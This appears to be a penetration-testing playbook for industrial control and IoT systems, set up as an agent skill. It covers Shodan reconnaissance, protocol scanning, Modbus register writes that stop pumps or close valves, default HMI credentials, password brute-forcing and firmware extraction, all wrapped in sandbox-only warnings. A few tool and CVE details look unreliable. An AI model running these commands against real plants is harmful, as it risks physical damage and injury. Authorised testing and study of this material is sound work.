# ICS/SCADA/OT & IoT Security Testing — Skill Playbook

**Mitre ATT&CK ID:** T0855 (Unauthorized Use of Control) / T0869 (Program Download)
**OWASP Mapping:** A01:2021 – Broken Access Control
**Severity:** Critical
**Last Updated:** 2026-08-04

---

## Metadata

```yaml
skill_id: ics-ot-iot
category: ics-ot
author: HiveBreach
mitre_attack_id: T0855
owasp_mapping:
  - A01:2021-BrokenAccessControl
tags:
  - ics
  - scada
  - ot
  - iot
  - modbus
  - dnp3
  - bacnet
  - opcua
  - s7comm
  - mqtt
  - ethernet-ip
  - profinet
  - plc
  - rtu
  - hmi
  - scada
  - firmware
  - uart
  - jtag
  - T0855
  - T0869
  - T0831
  - T0806
  - T0882
  - T0801
  - T0818
environments:
  - ics
  - ot
  - iot
verification_required: sandbox
```

---

## 1. Detection

### 1.1 Passive / Footprint Reconnaissance (Internet-Exposed Assets)

ICS/OT systems are frequently exposed to the internet via misconfigured firewalls or IoT VPNs. **Passive** discovery must precede any active scanning.

**Shodan search queries:**
```text
port:502                 Modbus/TCP
port:20000               DNP3
port:47808               BACnet (MS/TP over IP, 0xBAC0)
port:4840                OPC UA TCP
port:44818               EtherNet/IP (CIP)
port:102                 Siemens S7comm (S7-300/400/1200/1500)
port:1883                MQTT (unauthenticated brokers)
port:34964               PROFINET IO (DCP)
port:80 "PLC"            Web HMIs
port:5000/443 "WinCC"    Siemens WinCC web interface
```

**Censys queries:**
```text
services.port:502 or services.port:20000
services.port:47808 or services.port:44818
protocols:("modbus/tcp") or protocols:("dnp3")
```

Record the exact banner, vendor string, firmware version, and certificate details — these are your fingerprint seeds.

### 1.2 Active Network Discovery (Authorised Networks Only)

**Nmap host discovery across the OT segment:**
```bash
nmap -sn 10.10.1.0/24
sudo nmap -sn -PE -PP -PM 10.10.1.0/24
```

**Protocol service scan (identifies ALL ICS protocols at once):**
```bash
sudo nmap -sS -p 102,502,20000,44818,47808,4840,1883,34964 -Pn -T3 10.10.1.0/24
```

| Port | Protocol | Vendor/Typical Use |
|---|---|---|
| 102 | S7comm | Siemens PLCs (S7-300/400/1200/1500) |
| 502 | Modbus/TCP | Schneider, generic PLCs/RTUs, IoT gateways |
| 1883 | MQTT | IoT/IIoT message broker (TLS=8883) |
| 20000 | DNP3 | Grid / power substation RTUs, SCADA |
| 44818 | EtherNet/IP (CIP) | Rockwell/Allen-Bradley Logix |
| 47808 | BACnet/IP | Building Management Systems (HVAC) |
| 4840 | OPC UA | Historian / supervisory layer, unified access |
| 34964 | PROFINET IO (DCP) | Siemens industrial Ethernet |
| 80/443 | HTTP/S | Embedded web HMI, engineering station |
| 1433 | MSSQL | Historian DB (Wonderware/GE) |

### 1.3 Nmap NSE ICS Scripts

The NSE script engine has protocol-specific scripts — run them only after basic discovery confirms the protocol:

```bash
# Modbus
nmap -p502 --script modbus-discover 10.10.1.25
nmap -p502 --script modbus-discover --script-args=modbus-discover.aggressive=true 10.10.1.25

# EtherNet/IP / CIP
nmap -p44818 --script enip-info 10.10.1.30
nmap -p44818 --script cip-info 10.10.1.30

# BACnet
nmap -p47808 --script bacnet-info 10.10.1.40

# S7comm
nmap -p102 --script s7-info 10.10.1.50
```

### 1.4 Banner & Response Analysis

| Indicator | Likely Finding |
|---|---|
| `Modbus` banner / unknown function code response | Modbus/TCP controller |
| `S7` + S7comm negotiation in response | Siemens PLC |
| `BACnet` device objects enumerated | Building automation controller |
| MQTT CONNACK without auth requirement | Open MQTT broker |
| No banner but ICMP/port open on 502/20000 | Plaintext legacy protocol, high value |

---

## 2. Confirmation

### 2.1 Confirm the Protocol (Not Just the Port)

Port open ≠ protocol confirmed. Verify with protocol-aware requests:

**Modbus/TCP (device ID 1, read 10 holding registers, FC=3):**
```bash
modbus-cli -m tcp -s 10.10.1.25 -p 502 read 0 10
```

**BACnet (who-is broadcast):**
```bash
bacnet-mstp --who-is --ip 10.10.1.40:47808
```

**MQTT (subscribe without credentials):**
```bash
mosquitto_sub -h 10.10.1.60 -p 1883 -t '#' -v
```

**OPC UA (discover endpoints):**
```bash
opcua-client --url opc.tcp://10.10.1.70:4840 --browse
```

### 2.2 Enumerate Function Codes (Modbus)

| Function Code | Operation | Safety Note |
|---|---|---|
| 1 (0x01) | Read Coils | Safe |
| 2 (0x02) | Read Discrete Inputs | Safe |
| 3 (0x03) | Read Holding Registers | Safe |
| 4 (0x04) | Read Input Registers | Safe |
| 5 (0x05) | Write Single Coil | **DANGEROUS** |
| 6 (0x06) | Write Single Register | **DANGEROUS** |
| 15 (0x0F) | Write Multiple Coils | **DANGEROUS** |
| 16 (0x10) | Write Multiple Registers | **DANGEROUS** |
| 43 (0x2B) | Read Device Identification | Safe (fingerprint) |

Read-only functions (1-4, 43) are confirmatory and safe. **Never** send write functions (5,6,15,16) to real systems.

### 2.3 Read Registers (Read-Only, Confirmation Only)

```bash
# Read coil 0-9
modbus-cli -m tcp -s 10.10.1.25 -p 502 read 0 10 -t 1

# Read holding registers 0-9
modbus-cli -m tcp -s 10.10.1.25 -p 502 read 0 10 -t 3

# mbtget equivalent
mbtget -p 502 -s 10.10.1.25 -a 0 -n 10 read
```

Interpret register values as engineering units (pressure, temperature, valve state) — correlated register sweeps confirm a live process and reveal the register map.

### 2.4 Confirm Engineering / HMI Exposure

```bash
# Web HMI
curl -sk https://10.10.1.80/login | head -50
whatweb https://10.10.1.80

# Default credential checks are CONFIRMATION-only; document before attempting
```

---

## 3. Exploitation

### 3.1 PLC/RTU Attacks

#### 3.1.1 Modbus Register Write (SIMULATOR ONLY)
```bash
# Write holding register 5 to 0 (valve close / pump stop) — SIMULATOR ONLY
modbus-cli -m tcp -s 10.10.1.25 -p 502 write 5 0
mbtget -p 502 -s 10.10.1.25 -a 5 -v 0 write
```

#### 3.1.2 S7comm (Siemens)
```bash
# Read PLC info (snap7 / s7comm scripts)
nmap -p102 --script s7-info 10.10.1.50

# Program read/write requires S7commPlus handshake analysis — MITM only in lab
# Known default: S7-1200/1500 TCP/102 with pre-shared "S7CommPlus" auth bypass in CVE-2022-22551
```

#### 3.1.3 EtherNet/IP (Rockwell)
```bash
# CIP enumeration
nmap -p44818 --script enip-info,ipcrip-info 10.10.1.30

# RSLogix/Studio 5000 default: no auth on CIP forward-open (historic default)
# "Industrial Hacking with Rockwell" PoC chain: forward_open -> PLC stop -> upload ladder
```

#### 3.1.4 DNP3 (Grid RTUs)
```bash
# DNP3 enumeration (fragmented multi-frame, 0x28/0x44 headers)
nmap -p20000 --script dnp3-info 10.10.1.90
# Unsolicited responses / integrity poll confirm RTU presence
```

### 3.2 HMI/SCADA Attacks

#### 3.2.1 Default Credentials (Documented, Use ONLY in Sandbox)

| Product | Default Credentials |
|---|---|
| Wonderware InTouch/System Platform | `Administrator` / blank or `admin` |
| Rockwell FactoryTalk View | `Administrator` / blank |
| Siemens WinCC (TIA Portal) | `Administrator` / blank; `WinCC` / `WinCC` |
| GE iFIX | `Admin` / `password` |
| Inductive Automation Ignition | `admin` / `password` |
| Moxa / Advantech web HMIs | `admin` / `admin` |

#### 3.2.2 Exposed Web HMI Exploitation

```bash
# Identify tech stack
whatweb https://10.10.1.80

# Directory discovery
gobuster dir -u https://10.10.1.80 -w /usr/share/wordlists/dirb/common.txt -k -x php,asp

# Login brute force (AUTH LISTENED ONLY)
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt https-get://10.10.1.80/login

# Post-login: look for alarm acknowledge, setpoint write, tag browse endpoints
```

### 3.3 IoT Attacks

#### 3.3.1 Firmware Extraction (binwalk)
```bash
binwalk -e firmware.bin
binwalk -Me firmware.bin
binwalk --dd '.*' firmware.bin

# squashfs / cramfs roots
binwalk -e -M firmware.bin && find _firmware.bin.extracted -type f
```

#### 3.3.2 Firmwalker (Automated Secrets Scan)
```bash
./firmwalker.sh /path/to/firmware/extracted
# Finds hardcoded creds, default passwords, SSL keys, exposed services
```

#### 3.3.3 UART / JTAG (Physical)
```bash
# UART: identify via baud scan (115200, 57600, 38400, 9600 common)
sudo minicom -D /dev/ttyUSB0 -b 115200
# JTAG: OpenOCD + debug probe, dump firmware / NAND
openocd -f interface/jlink.cfg -f target/stm32f4x.cfg
```

#### 3.3.4 MQTT Without Auth (Cloud-to-Device)
```bash
# Subscribe to ALL topics
mosquitto_sub -h broker.iot.example.com -p 1883 -t '#' -v

# Publish to device commands (ONLY in sandbox)
mosquitto_pub -h broker.iot.example.com -p 1883 -t 'devices/sensor01/cmd' -m '{"cmd":"reset"}'

# AWS IoT / Azure IoT Hub-style topics: enumerate with crossbar.io-style fuzz
mqtt-fuzz -b broker.iot.example.com -p 1883 -t 'devices/#' 
```

#### 3.3.5 TTL Serial / UART Shell
```bash
# 3.3V TTL serial adapter, ground + TX + RX
# Drop into root shell on U-Boot / busybox devices
sudo screen /dev/ttyUSB0 115200
```

---

## 4. Tool-Specific Guidance

### 4.1 Passive Footprinting

```bash
# Shodan CLI
shodan search 'port:502' --fields ip_str,port,hostnames
shodan search 'port:20000 country:US'
shodan host <ip>

# Censys
censys search "services.port:502"
censys view <ip>
```

### 4.2 Active Protocol Tools

```bash
# modbus-cli
modbus-cli -m tcp -s 10.10.1.25 -p 502 read 0 10        # read
modbus-cli -m tcp -s 10.10.1.25 -p 502 write 5 0        # write (SIM ONLY)

# mbtget
mbtget -p 502 -s 10.10.1.25 -a 0 -n 10 read             # read holding
mbtget -p 502 -s 10.10.1.25 -a 5 -v 0 write             # write (SIM ONLY)

# plcscan (multi-protocol banner grabber)
plcscan.py 10.10.1.0/24 502
plcscan.py 10.10.1.0/24 102
plcscan.py 10.10.1.0/24 20000

# GRASSMARLIN (passive ICS mapping, network tap / pcap)
grassmarlin --pcap ot-traffic.pcap --outdir ./output
```

### 4.3 Firmware & IoT Analysis

```bash
# binwalk
binwalk -Me firmware.bin

# Firmwalker
./firmwalker.sh extracted_firmware/

# Autopsy (forensic filesystem analysis of flash dumps)
autopsy --db autopsy.db --index extracted_firmware/

# IoTSecFuzz (IoT protocol fuzzing frameworks)
# - AMF fuzzer
# - CoAP fuzzer
# - MQTT fuzzer
python3 fuzzer_main.py --mod mqtt
```

### 4.4 Protocol Fuzzing (Sandbox Only)

```bash
# Scapy-based custom fuzzers
python3 -c "from scapy.all import *; pkt = TCP(dport=502)/Raw(load=bytes([0,1,0,0,0,6,1,3,0,0,0,1])); send(IP(dst='10.10.1.25')/pkt)"

# Metasploit auxiliaries
use auxiliary/scanner/scada/modbus_client
use auxiliary/scanner/scada/modbus_banner
use auxiliary/scanner/scada/iec61850_simulator
```

---

## 5. PoC Generation

Every finding must produce a reproducible Proof of Concept **against the sandbox**, not the production system.

### PoC Template

```markdown
## ICS/OT — [FINDING_ID]

**Asset:** 10.10.1.25:502 (Modbus/TCP)
**Protocol:** Modbus / DNP3 / BACnet / S7comm / MQTT / EtherNet/IP
**Finding Type:** Unauthenticated read / Unauthenticated write / Default creds / Firmware secret

### Payload
```
modbus-cli -m tcp -s <sim-ip> -p 502 read 0 10
```

### Evidence
- [Register/coil snapshot before and after]
- [Banner or NSE script output]
- [Screenshot of HMI login / admin panel]
- [Firmware strings: hardcoded creds, SSH keys, API tokens]

### Impact
- Operational: read of 400 live registers exposed
- Physical: [valve/pump/motor setpoint writeable] — SANDBOX ONLY
- Data: historical tag data, alarm records, engineering diagrams

### Remediation
- Segregate OT network; no direct internet exposure
- Enforce authenticated protocol layers (TLS/DTLS, S7commPlus, OPC UA auth)
- Decommission legacy plaintext protocols (Modbus/DNP3) behind firewalls
- Change default credentials; central identity (RADIUS/LDAP/OPC UA X.509)
- Network segmentation + EDR on engineering workstations

### Reproduction Steps
1. `nmap -p502 --script modbus-discover <sim-ip>` to confirm protocol.
2. `modbus-cli -m tcp -s <sim-ip> -p 502 read 0 10` to read registers.
3. (Write) `modbus-cli -m tcp -s <sim-ip> -p 502 write 5 0` against OpenPLC/Conpot **only**.
4. Document that no real-world asset was targeted.
```

---

## 6. Verification (Sandbox)

### 6.1 Sandbox/Emulation Platforms

| Platform | Purpose |
|---|---|
| **OpenPLC** | Software PLC running Modbus/TCP, DNP3, Ethernet/IP — real function code behaviour |
| **pythonmodbus** | Lightweight Modbus TCP/RTU simulator for function-code tests |
| **Conpot** | Honeypot simulating Modbus, HTTP, TFTP, SNMP, BACnet — safe fake PLCs |
| **GridEx** | Grid resilience exercise simulator (macro grid behaviour, no real control) |
| **Docker** | Containerised brokers/PLCs: `eclipse-mosquitto`, `opcua-asyncio` server images |
| **MiniCPS / FACT** | Emulated CPS for full attack chains |

### 6.2 Docker-based Verification Example

```bash
docker run -d --name mosquitto -p 1883:1883 eclipse-mosquitto
mosquitto_sub -h localhost -p 1883 -t '#' -v   # confirm no-auth subscribe

docker run -d --name openplc -p 502:502 autowp/openplc
modbus-cli -m tcp -s 127.0.0.1 -p 502 read 0 10
```

### 6.3 Verification Checklist

- [ ] Finding reproduced against OpenPLC / Conpot / Docker emulation
- [ ] Read-only tests only on real segments; writes never leave sandbox
- [ ] Impact scoped honestly: "would affect production" vs "demonstrated in sandbox"
- [ ] Firmware analysed from a legitimate, authorised acquisition
- [ ] No destructive commands (stop PLC, reset controller, firmware flash) ever sent to real ICS
- [ ] Network capture (pcap) retained as chain-of-custody evidence

### 6.4 Prohibited Actions (Real Systems)

- Sending write function codes (5, 6, 15, 16) to any live controller
- STOP/RUN commands to live PLCs (S7comm STOP, CIP stop)
- Firmware modification or flashing
- Ladder logic upload/download to production PLCs
- Alarm/command injection into live HMI/SCADA
- Disconnecting safety-instrumented systems (SIS)

---

## 7. ICS-Specific Threat Considerations

### 7.1 Safety-Critical Rules (R3 — No Destructive Commands to Real ICS)

> **CRITICAL:** Never send destructive commands to real ICS systems. Physical harm, environmental damage, and loss of life are possible. All exploitation of write functions is strictly limited to simulators (OpenPLC, Conpot, pythonmodbus, docker) in a sandbox.

| Command | Real System | Sandbox |
|---|---|---|
| Read coils/registers | Allowed | Allowed |
| Write coil/register | **NEVER** | Allowed |
| PLC STOP/RUN | **NEVER** | Allowed |
| Firmware flash/upload | **NEVER** | Allowed |
| Setpoint modification | **NEVER** | Allowed |
| Alarm acknowledge | **NEVER** | Allowed |

### 7.2 Engineering Workstation Attacks

```bash
# TIA Portal (Siemens) default: engineering station trusts network, no host firewall
# RSLogix Studio 5000: CIP path attacks (CVE-2017-14406/14407) — MITM in lab only
# Look for:
#   - Passwords in project files (TIA Portal *.zap, RSLogix .acd) -> strings
#   - Stored SSH keys / WinSCP sessions on workstation
#   - Unpatched EWS exposing OPC DA / DCOM (RPC, 135)
```

### 7.3 State & Monitoring Attacks

- T0801 (Monitor Process State): passive read of coils/registers to map a process and infer unsafe states — no writes required.
- T0882 (Theft of Operational Information): register sweeps, historian export, engineering diagrams, HMI tag dumps.
- T0818 (Engineering Workstation Compromise): the EWS is the crown jewel; lateral movement targets it.

---

## 8. Related Techniques (MITRE ATT&CK Mapping)

*Note: For ICS/OT, the **MITRE ATT&CK for ICS matrix** applies (https://attack.mitre.org/matrices/ics/), distinct from the enterprise matrix.*

| Technique ID | Name | Relation |
|---|---|---|
| T0855 | Unauthorized Use of Device in Control System | Primary — unauth register/coil write |
| T0869 | Program Download | Ladder logic / program upload |
| T0831 | Manipulation of Control | Forcing unsafe process states |
| T0806 | Unauthorized Command Message | Spoofed/forged protocol commands |
| T0801 | Monitor Process State | Passive register/coil monitoring |
| T0882 | Theft of Operational Information | Data exfiltration of process data |
| T0818 | Engineering Workstation Compromise | Lateral movement to EWS |
| T0836 | Modify Control Logic | Tamper with PLC program |
| T0821 | Modify Controller Tasking | Change scan times / task scheduling |
| T0858 | Change Point Value | Alter setpoints via HMI/API |
| T0888 | Remote System Discovery | OT host/protocol fingerprinting |
| T0849 | Program Organization Units | Malicious logic blocks (Siemens) |
| T0857 | System Firmware | Firmware backdooring |
| T0889 | Alternate Network Medium | UART/JTAG/physical access |

---

## 9. References

- MITRE ATT&CK for ICS: https://attack.mitre.org/matrices/ics/
- MITRE ATT&CK T0855: https://attack.mitre.org/techniques/T0855/
- MITRE ATT&CK T0869: https://attack.mitre.org/techniques/T0869/
- Nmap NSE ICS scripts: https://nmap.org/nsedoc/categories/ics.html
- modbus-cli: https://github.com/tallakt/modbus-cli
- mbtget: https://github.com/sourceperl/mbtget
- plcscan: https://github.com/mehay/plcscan
- GRASSMARLIN: https://github.com/iadgov/GRASSMARLIN
- binwalk: https://github.com/ReFirmLabs/binwalk
- Firmwalker: https://github.com/craigz28/firmwalker
- IoTSecFuzz: https://github.com/turbo/Kitty and https://github.com/fuzzitdev
- OpenPLC: https://github.com/thiagoralves/OpenPLC_v3
- Conpot: https://github.com/mushorg/conpot
- GridEx: https://www.energy.gov/ceser/gridex
- OWASP IoT Security: https://owasp.org/www-project-internet-of-things/
- SANS ICS Security: https://www.sans.org/ics-security/

---

*This playbook is for authorised security testing only. All verification must occur in sandbox environments. Never send destructive commands to real ICS/SCADA/OT systems — physical harm and loss of life are possible. Read-only testing against in-scope production assets requires explicit written authorisation.*
